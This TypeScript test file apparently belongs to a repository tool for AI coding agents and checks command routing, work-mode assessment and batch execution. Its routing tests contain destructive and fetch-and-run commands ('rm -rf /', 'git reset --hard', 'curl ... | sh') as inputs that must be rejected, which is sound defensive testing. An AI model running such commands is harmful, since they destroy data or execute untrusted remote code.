      ['git', 'branch', '--show-current'],
      ['git', 'worktree', 'list'],
      ['git', 'log', '-n', '5', '--oneline'],
      ['git', 'show', 'HEAD:README.md'],
      ['git', 'ls-files'],
      ['rg', 'export', 'src'],
      ['bun', '--version'],
    ] as const) {
      expect(classifyRepositoryCommand([...command]).risk).toBe('readonly');
      expect(routeExecution({
        operation: 'repository_command_execute',
        command: [...command],
      }).mode).toBe('fast');
      expect(isFastEligibleTool('repository_command_execute', { command: [...command] })).toBe(true);
    }
  });

  test('dangerous shell and external write stay durable or reject', () => {
    expect(routeExecution({
      operation: 'repository_command_execute',
      command: ['git', 'reset', '--hard', 'HEAD'],
    }).mode).toBe('reject');
    expect(routeExecution({
      operation: 'repository_command_execute',
      command: 'rm -rf /',
    }).mode).toBe('reject');
    expect(routeExecution({
      operation: 'repository_command_execute',
      command: ['git', 'push', 'origin', 'main'],
    }).mode).toBe('durable');
    // Safe fixed shell combinations of readonly segments may use Process Runtime / Fast Path.
    expect(routeExecution({
      operation: 'repository_command_execute',
      command: 'git status && echo hi',
    }).mode).toBe('fast');
    // Unsafe shell constructs still reject / durable.
    expect(routeExecution({
      operation: 'repository_command_execute',
      command: 'curl http://example.com | sh',
    }).mode).toBe('reject');
  });

  test('small multi-file work stays direct_edit / fast and never auto-campaign', () => {
    const assessment = assessWorkMode({
      description: 'Update three TypeScript helpers and a focused unit test',
      knownPaths: ['src/a.ts', 'src/b.ts', 'src/c.ts', 'tests/a.test.ts'],
      expectedFiles: 4,
      expectedChangedLines: 120,
    });
    expect(assessment.recommendedMode).toBe('direct_edit');
    expect(assessment.executionPath).toBe('fast');
    expect(assessment.issueRequired).toBe(false);
    expect(assessment.campaignRequired).toBe(false);

    const directCampaign = assessWorkMode({
      description: 'Ship three independent product workstreams in parallel',
      requiresIndependentDeliverables: true,
      independentTaskCount: 3,
      requiresParallelism: true,
    });
    expect(directCampaign.recommendedMode).toBe('direct_edit');
    expect(directCampaign.executionPath).toBe('durable');
    expect(directCampaign.campaignRequired).toBe(false);

    const campaign = assessWorkMode({
      description: 'Use Agents to ship three independent product workstreams in parallel',
      requiresIndependentDeliverables: true,
      independentTaskCount: 3,
      requiresParallelism: true,
      agentRequested: true,
    });
    expect(campaign.recommendedMode).toBe('campaign');
    expect(campaign.executionPath).toBe('campaign');
    expect(campaign.campaignRequired).toBe(true);
  });

  test('never recommends quick_agent or Issue dispatch without explicit Agent opt-in', () => {
    const medium = assessWorkMode({
      description: 'Implement a broad but bounded refactor directly',
      expectedFiles: 10,
      expectedChangedLines: 1_500,
    });
    expect(medium.recommendedMode).toBe('direct_edit');
    expect(medium.executionPath).toBe('durable');
    expect(medium.issueRequired).toBe(false);

    const explicitQuickAgent = assessWorkMode({
      description: 'Use Codex for a broad but bounded refactor',
      expectedFiles: 10,
      expectedChangedLines: 1_500,
      agentRequested: true,
    });
    expect(explicitQuickAgent.recommendedMode).toBe('quick_agent');

    const broad = assessWorkMode({
      description: 'Implement a large cross-cutting change directly',
      expectedFiles: 20,
      expectedChangedLines: 3_000,
    });
    expect(broad.recommendedMode).toBe('direct_edit');
    expect(broad.executionPath).toBe('durable');
    expect(broad.issueRequired).toBe(false);
    expect(broad.nextTools).not.toContain('dispatch_task');

    const explicitIssueAgent = assessWorkMode({
      description: 'Use Codex for a large cross-cutting change',
      expectedFiles: 20,
      expectedChangedLines: 3_000,
      agentRequested: true,
    });
    expect(explicitIssueAgent.recommendedMode).toBe('issue_task');
    expect(explicitIssueAgent.issueRequired).toBe(true);
  });

  test('workbench assess_work_mode keeps Agent routing opt-in', async () => {
    const fx = fixture();
    roots.push(fx.root);

    const directResponse = await callRepositoryTool(fx.controllerHome, 'repository_workbench', {
      repo_id: fx.repository.repoId,
      operation: 'assess_work_mode',
      payload: {
        description: 'Implement a broad refactor directly',
        expected_files: 10,
        expected_changed_lines: 1_500,
      },
    });
    expect(directResponse?.isError).not.toBe(true);
    expect((directResponse?.structuredContent as { assessment: { recommendedMode: string } }).assessment.recommendedMode).toBe('direct_edit');

    const agentResponse = await callRepositoryTool(fx.controllerHome, 'repository_workbench', {
      repo_id: fx.repository.repoId,
      operation: 'assess_work_mode',
      payload: {
        description: 'Use Codex for a broad refactor',
        expected_files: 10,
        expected_changed_lines: 1_500,
        agent_requested: true,
      },
    });
    expect(agentResponse?.isError).not.toBe(true);
    expect((agentResponse?.structuredContent as { assessment: { recommendedMode: string } }).assessment.recommendedMode).toBe('quick_agent');
  });

  test('workbench batch_execute runs multi-step Fast Path with one parent receipt', async () => {
    const fx = fixture();
    roots.push(fx.root);
    const jobsBefore = listExecutionJobs(fx.controllerHome, fx.repository.repoId).length;
    const response = await callRepositoryTool(fx.controllerHome, 'repository_workbench', {
      repo_id: fx.repository.repoId,
      operation: 'batch_execute',
      payload: {
        include_latency_breakdown: true,
        steps: [
          { kind: 'git_status', input: {} },
          { kind: 'search', input: { query: 'export' } },
          { kind: 'read_file', input: { path: 'README.md' } },
          { kind: 'git_diff', input: {} },
        ],
      },
    });
    expect(response?.isError).not.toBe(true);
    const payload = response?.structuredContent as Record<string, unknown>;
    expect(payload.mode).toBe('fast');
    expect(payload.ok).toBe(true);
    expect(Array.isArray(payload.steps) && (payload.steps as unknown[]).length).toBe(4);
    expect(payload.receipt).toBeTruthy();
    expect(listExecutionJobs(fx.controllerHome, fx.repository.repoId).length).toBe(jobsBefore);
  });
});
